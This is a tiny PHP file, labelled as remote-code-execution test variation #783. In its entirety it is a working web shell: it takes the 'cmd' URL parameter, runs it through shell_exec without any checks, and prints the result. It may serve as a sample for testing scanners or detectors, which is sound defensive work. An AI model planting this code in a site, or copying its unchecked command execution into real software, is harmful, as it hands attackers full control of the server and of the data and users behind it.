<?php
// RCE test variation #783
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>